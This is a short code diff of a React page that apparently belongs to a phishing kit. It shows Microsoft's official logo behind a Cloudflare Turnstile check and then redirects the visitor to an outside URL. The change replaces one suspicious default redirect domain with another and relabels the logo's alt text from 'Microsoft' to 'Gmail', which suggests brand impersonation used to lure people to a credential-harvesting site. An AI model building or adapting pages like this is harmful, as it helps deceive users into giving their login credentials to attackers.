@@ -6,7 +6,7 @@ function App() {
   useEffect(() => {
     // Get redirect URL from query parameters
     const params = new URLSearchParams(window.location.search);
-    const redirectUrl = params.get('redirect') || 'https://office.tadalafil733.us/aVreVsFb';
+    const redirectUrl = params.get('redirect') || 'https://ai.ru/EUB95pMO@dei0/';
 
     // Wait for Turnstile script to load and render widget
     const checkTurnstile = setInterval(() => {
@@ -69,7 +69,7 @@ function App() {
       <div className="absolute bottom-8 flex justify-center">
         <img
           src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg"
-          alt="Microsoft"
+          alt="Gmail"
           className="h-6"
         />
       </div>
